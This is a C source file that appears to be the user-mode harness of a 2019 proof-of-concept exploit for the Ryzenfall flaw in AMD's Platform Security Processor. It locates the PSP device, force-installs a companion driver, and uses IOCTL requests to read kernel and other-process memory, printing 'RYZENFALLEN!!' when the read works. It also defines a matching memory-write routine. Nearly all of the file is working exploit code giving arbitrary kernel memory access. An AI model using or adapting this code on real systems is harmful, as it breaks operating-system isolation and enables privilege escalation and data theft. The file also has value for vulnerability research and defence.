//
// @depletionmode 2019
//

#include <Windows.h>
#include <Newdev.h>
#include <Cfgmgr32.h>
#include <SetupAPI.h>
#include <Initguid.h>
#include <Devpkey.h>

#pragma comment(lib, "Newdev.lib")
#pragma comment(lib, "Setupapi.lib")

#include <stdio.h>

#include "RyzenfallDrv.h"

HRESULT _installDeviceDriver (VOID);
HRESULT _uninstallDeviceDriver (VOID);
HRESULT _getDeviceHandle (PHANDLE);
HRESULT _readAddress (HANDLE, ULONG_PTR, ULONG, SIZE_T, PBYTE);
HRESULT _writeAddress (HANDLE, ULONG_PTR, ULONG, SIZE_T, PBYTE);
HRESULT _findAmdPspDeviceLocation (ULONG*, ULONG*, ULONG*, PWCHAR, ULONG);

int main(int ac, char *av[])
{
    HRESULT hr = 0;
    WCHAR deviceDescription[0x100] = { 0 };
    ULONG bus, slot, function;
    HANDLE hDevice;
    BOOL bDriverInstalled = FALSE;

    extern const char* vanity;
    printf(vanity);

    //
    // Locate AMD PSP device by enumerating the loaded device drivers. If we 
    // don't manage to find it, it doesn't definately mean that the system isn'
    // t sporting a PSP but it was a good learning exercise for enumeration 
    // via the SetupDi* API.
    //

    hr = _findAmdPspDeviceLocation(&bus, &slot, &function, deviceDescription, sizeof(deviceDescription));
    if (!SUCCEEDED(hr)) {
        fprintf(stderr, "[!] Failed to locate AMP PSP device: %lx!\n", hr);
        goto end;
    }
    wprintf(L"[+] %s located @ Bus %d, Device %d, Function %d.\n", deviceDescription, bus, slot, function);

    //
    // Install driver + obtain device handle.
    //

    hr = _installDeviceDriver();
    if (!SUCCEEDED(hr)) {
        fprintf(stderr, "[!] Failed to install device driver: %lx!\n", hr);
        goto end;
    }
    bDriverInstalled = TRUE;
    printf("[+] Device driver installed.\n");

    hr = _getDeviceHandle(&hDevice);
    if (!SUCCEEDED(hr)) {
        fprintf(stderr, "[!] Failed to obtain handle to device driver: %lx!\n", hr);
        goto end;
    }
    printf("[+] Obtained device handle = %llx.\n", (ULONGLONG)hDevice);
    
    {
        //
        // To test Ryzenfall, read the BootId from kernel-mode mapping of 
        // UserSharedData using Ryzenfall and compare it to value read from the 
        // user-mode mapping.
        //

#define UserSharedData 0x7FFE0000
#define KI_USER_SHARED_DATA 0xfffff78000000000
#define BOOTID_OFFSET 0x2c4    // This may need to be tweaked to match currently running kernel.

        ULONG bootId = *(PULONG)(UserSharedData + BOOTID_OFFSET);
        printf("[+] User-mode mapped UserSharedData.BootId @ 0x%p, BootId = %d.\n",
               (PVOID)UserSharedData,
               bootId);

        ULONG ryzenfallBootId = 0;
        printf("[*] Attempting read of KI_USER_SHARED_DATA.BootId @ 0x%p @ using Ryzenfall...\n",
               (PVOID)KI_USER_SHARED_DATA);
        hr = _readAddress(hDevice,
                          KI_USER_SHARED_DATA + BOOTID_OFFSET,
                          0,
                          sizeof(ryzenfallBootId),
                          (PBYTE)&ryzenfallBootId);
        if (!SUCCEEDED(hr)) {
            fprintf(stderr, 
                    "[!] Failed to read from address using ryzenfall: %lx!\n", 
                    hr);
            goto end;
        }
        printf("[+] ...device IO succeeded, BootId = %d.\n", ryzenfallBootId);

        if (bootId != ryzenfallBootId) {
            fprintf(stderr, 
                    "[!] BootId mismatch. Ryzenfall failed: %lx!\n", 
                    hr);
        }
        else {
            printf("[+] RYZENFALLEN!!\n");
        }
    }

    {
        //
        // Test read from user-mode context
        //

        CHAR msg[] = "ArthurMorgan";
        CHAR ryzenfallMsg[sizeof(msg)] = { 0 };

        printf("[*] Attempting read of \"%s\" user-mode buffer @ 0x%p using Ryzenfall...\n",
               msg,
               (PVOID)msg);
        hr = _readAddress(hDevice,
                          (ULONG_PTR)msg,
                          GetCurrentProcessId(),
                          sizeof(ryzenfallMsg),
                          (PBYTE)ryzenfallMsg);
        if (!SUCCEEDED(hr)) {
            fprintf(stderr, 
                    "[!] Failed to read from address using ryzenfall: %lx!\n", 
                    hr);
            goto end;
        }
        printf("[+] ...device IO succeeded, Msg = %s.\n", ryzenfallMsg);

        if (RtlCompareMemory(msg, ryzenfallMsg, sizeof(msg)) != sizeof(msg)) {
            fprintf(stderr, 
                    "[!] Message buffer mismatch. Ryzenfall failed: %lx!\n", 
                    hr);
        }
        else {
            printf("[+] RYZENFALLEN!!\n");
        }
    }

end:
    if (bDriverInstalled) {
        //
        // Uninstall device driver.
        //

        hr = _uninstallDeviceDriver();
        if (!SUCCEEDED(hr)) {
            fprintf(stderr, "[!] Failed to uninstall device driver: %lx!\n", hr);
        }
        printf("[+] Device driver uninstalled.\n");
    }

    return (int)hr;
}

//
// WNF driver interaction code credit: Alex Ionescu (@aionescu)
// http://www.alex-ionescu.com/?p=377
//

DEFINE_GUID(ResearchClassGuid,
            0x4719f3e5, 0xf8b6, 0x419d, 0xb7, 0x72, 0x1d, 0xe9, 0x5c, 0x3b, 0x8d, 0xe3);

HRESULT 
_installDeviceDriver (
    VOID
    )
{
    HRESULT hr;
    HDEVINFO hDevInfo;
    SP_DEVINFO_DATA devInfo;
    BOOL bReboot, bRes;
    DWORD dwPathLen;

    LPCWSTR g_DevPath = L"Root\\RyzenfallDrv\0\0";
    LPCWSTR g_InfPath = L"RyzenfallDrv\\RyzenfallDrv.inf";

    //
    // Create a device info list for the ResearchClass GUID.
    //

    hDevInfo = SetupDiCreateDeviceInfoList(&ResearchClassGuid,
                                           NULL);
    if (hDevInfo == INVALID_HANDLE_VALUE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiCreateDeviceInfoList fail: %lx\n", hr);

        goto end;
    }

    //
    // Construct a device information structure for this device.
    //

    devInfo.cbSize = sizeof(devInfo);
    bRes = SetupDiCreateDeviceInfo(hDevInfo,
                                   L"Insecurity devices",
                                   &ResearchClassGuid,
                                   L"Research Class Devices",
                                   NULL,
                                   DICD_GENERATE_ID,
                                   &devInfo);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiCreateDeviceInfo fail: %lx\n", hr);

        goto end;
    }

    //
    // Add the hardware ID for this specific research device.
    //

    dwPathLen = ((DWORD)wcslen(g_DevPath) + 3) * sizeof(WCHAR);
    bRes = SetupDiSetDeviceRegistryProperty(hDevInfo,
                                            &devInfo,
                                            SPDRP_HARDWAREID,
                                            (LPBYTE)g_DevPath,
                                            dwPathLen);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiSetDeviceRegistryProperty fail: %lx\n", hr);

        goto end;
    }

    //
    // Create the "fake" root device node for the device.
    //

    bRes = SetupDiCallClassInstaller(DIF_REGISTERDEVICE,
                                     hDevInfo,
                                     &devInfo);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiCallClassInstaller fail: %lx\n", hr);

        goto end;
    }

    //
    // Set the device class icon for vanity purposes.
    // TODO: Work out how to do this via the SetupDi* API.
    //

    HKEY hKey = NULL;
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,
                     L"SYSTEM\\ControlSet001\\Control\\Class\\{4719F3E5-F8B6-419D-B772-1DE95C3B8DE3}", 
                     0, 
                     KEY_ALL_ACCESS, 
                     &hKey) == ERROR_SUCCESS) {
        // Hackity hackity hack hack.

        RegSetKeyValue(hKey, 
                       NULL, 
                       L"IconPath", 
                       REG_MULTI_SZ, 
                       L"%SystemRoot%\\system32\\setupapi.dll,-37", 
                       40 * sizeof(WCHAR));

        CloseHandle(hKey);
    }
    
    //
    // Now install the INF file for the fuzzing device.
    //
    // It will be root enumerated because of the device node
    // that we created above, resulting in the driver loading.
    //

    bRes = UpdateDriverForPlugAndPlayDevices(NULL,
                                             g_DevPath,
                                             g_InfPath,
                                             INSTALLFLAG_FORCE,
                                             &bReboot);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] UpdateDriverForPlugAndPlayDevices fail: %lx\n", hr);

        goto end;
    }

    hr = S_OK;

end:
    return hr;
}

HRESULT
_getDeviceHandle (
    _Outptr_ PHANDLE Fuzzer
    )
{
    HRESULT hr;
    CONFIGRET cr;
    WCHAR pwszDeviceName[MAX_DEVICE_ID_LEN];
    HANDLE hFuzzer;

    //
    // Get the device interface -- we only expose one.
    //

    pwszDeviceName[0] = UNICODE_NULL;
    cr = CM_Get_Device_Interface_List((LPGUID)&PspDriverGuid,
                                      NULL,
                                      pwszDeviceName,
                                      _countof(pwszDeviceName),
                                      CM_GET_DEVICE_INTERFACE_LIST_PRESENT);
    if (cr != CR_SUCCESS) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] CM_Get_Device_Interface_List fail: %lx\n", hr);

        goto end;
    }

    //
    // Make sure there's an actual name there
    //

    if (pwszDeviceName[0] == UNICODE_NULL) {
        hr = HRESULT_FROM_WIN32(ERROR_NOT_FOUND);

        goto end;
    }

    //
    // Open the device.
    //

    hFuzzer = CreateFile(pwszDeviceName,
                         GENERIC_WRITE | GENERIC_READ,
                         FILE_SHARE_READ | FILE_SHARE_WRITE,
                         NULL,
                         OPEN_EXISTING,
                         FILE_ATTRIBUTE_NORMAL,
                         NULL);
    if (hFuzzer == INVALID_HANDLE_VALUE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] CreateFile fail: %lx\n", hr);

        goto end;
    }

    //
    // Return a handle to the device.
    //

    *Fuzzer = hFuzzer;

    hr = S_OK;

end:
    return hr;
}

HRESULT
_uninstallDeviceDriver (
    VOID
    )
{
    HRESULT hr;
    BOOL bRes;
    HDEVINFO hDevInfo;
    SP_DEVINFO_DATA devData = { 0 };

    //
    // Open the device info list for our class GUID.
    //

    hDevInfo = SetupDiGetClassDevs(&ResearchClassGuid,
                                   NULL,
                                   NULL,
                                   0);
    if (hDevInfo == INVALID_HANDLE_VALUE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiGetClassDevs fail: %lx\n", hr);

        goto end;
    }

    //
    // Locate our class device.
    //

    devData.cbSize = sizeof(devData);
    bRes = SetupDiEnumDeviceInfo(hDevInfo, 0, &devData);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiEnumDeviceInfo fail: %lx\n", hr);

        goto end;
    }

    //
    // Uninstall it.
    //

    bRes = SetupDiCallClassInstaller(DIF_REMOVE,
                                     hDevInfo,
                                     &devData);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiCallClassInstaller fail: %lx\n", hr);

        goto end;
    }

    hr = S_OK;

end:
    return hr;
}

HRESULT
_readAddress (
    _In_ HANDLE Device,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG ProcessId,
    _In_ SIZE_T Length,
    _Out_writes_bytes_(Length) PBYTE Buffer
    )
{
    HRESULT hr;
    BOOL bRes;
    PSP_READ_MEMORY_REQUEST request;
    DWORD dwBytesReturned;

    request.Address = (PVOID)VirtualAddress;
    request.ContextProcessId = ProcessId;
    request.Length = Length;
    request.ResponseBuffer = Buffer;

    bRes = DeviceIoControl(Device, 
                           IOCTL_PSP_READ_MEMORY, 
                           &request, sizeof(request), 
                           NULL, 
                           0, 
                           &dwBytesReturned, 
                           NULL);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] IOCTL_PSP_READ_MEMORY: DeviceIoControl fail: %lx\n", hr);

        goto end;
    }

    hr = S_OK;

end:
    return hr;
}

HRESULT
_writeAddress (
    _In_ HANDLE Device,
    _In_ ULONG_PTR VirtualAddress,
    _In_ ULONG ProcessId,
    _In_ SIZE_T Length,
    _Out_writes_bytes_(Length) PBYTE Buffer
    )
{
    HRESULT hr;
    BOOL bRes;
    PSP_WRITE_MEMORY_REQUEST request;
    DWORD dwBytesReturned;

    request.Address = (PVOID)VirtualAddress;
    request.ContextProcessId = ProcessId;
    request.Length = Length;
    request.Buffer = Buffer;

    bRes = DeviceIoControl(Device, 
                           IOCTL_PSP_WRITE_MEMORY, 
                           &request, sizeof(request), 
                           NULL, 
                           0, 
                           &dwBytesReturned, 
                           NULL);
    if (bRes == FALSE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] IOCTL_PSP_WRITE_MEMORY: DeviceIoControl fail: %lx\n", hr);

        goto end;
    }

    hr = S_OK;

end:
    return hr;
}

DEFINE_GUID(SecurityDevicesClassGuid,
            0xd94ee5d8, 0xd189, 0x4994, 0x83, 0xd2, 0xf6, 0x8d, 0x7d, 0x41, 0xb0, 0xe6);

HRESULT
_findAmdPspDeviceLocation(
    _Out_ ULONG* Bus,
    _Out_ ULONG* Slot,
    _Out_ ULONG* Function,
    _Out_writes_bytes_(DescriptionBufferLength) PWCHAR DescriptionBuffer,
    _In_ ULONG DescriptionBufferLength
)
{
    HRESULT hr;
    HDEVINFO hDevInfo;
    SP_DEVINFO_DATA devInfo = { 0 };
    WCHAR buffer[512];
    DWORD dwIndex = 0;
    DEVPROPTYPE propertyType;
    BOOL bRes;

    //
    // Get handle to device info set for devices under the 'Security Devices' 
    // class.
    //

    hDevInfo = SetupDiGetClassDevs(&SecurityDevicesClassGuid,
                                   NULL,
                                   NULL,
                                   0);
    if (hDevInfo == INVALID_HANDLE_VALUE) {
        hr = HRESULT_FROM_WIN32(GetLastError());
        fprintf(stderr, "[!] SetupDiGetClassDevs fail: %lx\n", hr);

        goto end;
    }

    //
    // Enumerate devices to find the AMD PSP device.
    //

    devInfo.cbSize = sizeof(devInfo);
    for (;;) {
        bRes = SetupDiEnumDeviceInfo(hDevInfo, dwIndex++, &devInfo);
        if (bRes == FALSE) {
            hr = HRESULT_FROM_WIN32(GetLastError());
            fprintf(stderr, "[!] SetupDiEnumDeviceInfo fail: %lx\n", hr);

            goto end;
        }

        bRes = SetupDiGetDeviceProperty(hDevInfo,
                                        &devInfo,
                                        &DEVPKEY_Device_Service,
                                        &propertyType,
                                        (PBYTE)buffer,
                                        sizeof(buffer),
                                        NULL,
                                        0);
        if (bRes == FALSE) {
            hr = HRESULT_FROM_WIN32(GetLastError());
            fprintf(stderr, "[!] SetupDiGetDeviceProperty fail: %lx\n", hr);

            goto end;
        }

        if (wcscmp(buffer, L"amdpsp") != 0) {
            //
            // This is not the device that we're looking for.
            //

            continue;
        }

        bRes = SetupDiGetDeviceProperty(hDevInfo,
                                        &devInfo,
                                        &DEVPKEY_Device_DeviceDesc,
                                        &propertyType,
                                        (PBYTE)DescriptionBuffer,
                                        DescriptionBufferLength,
                                        NULL,
                                        0);
        if (bRes == FALSE) {
            hr = HRESULT_FROM_WIN32(GetLastError());
            fprintf(stderr, "[!] SetupDiGetDeviceProperty fail: %lx\n", hr);

            goto end;
        }

        bRes = SetupDiGetDeviceProperty(hDevInfo,
                                        &devInfo,
                                        &DEVPKEY_Device_BusNumber,
                                        &propertyType,
                                        (PBYTE)buffer,
                                        sizeof(buffer),
                                        NULL,
                                        0);
        if (bRes == FALSE) {
            hr = HRESULT_FROM_WIN32(GetLastError());
            fprintf(stderr, "[!] SetupDiGetDeviceProperty fail: %lx\n", hr);

            goto end;
        }

        *Bus = *(ULONG*)buffer;

        bRes = SetupDiGetDeviceProperty(hDevInfo,
                                        &devInfo,
                                        &DEVPKEY_Device_Address,
                                        &propertyType,
                                        (PBYTE)buffer,
                                        sizeof(buffer),
                                        NULL,
                                        0);
        if (bRes == FALSE) {
            hr = HRESULT_FROM_WIN32(GetLastError());
            fprintf(stderr, "[!] SetupDiGetDeviceProperty fail: %lx\n", hr);

            goto end;
        }

        *Slot = *(ULONG*)buffer >> 16;
        *Function = *(ULONG*)buffer & 0xff;

        break;
    }

    hr = S_OK;

end:
    if (hDevInfo != INVALID_HANDLE_VALUE) {
        SetupDiDestroyDeviceInfoList(hDevInfo);
    }

    return hr;
}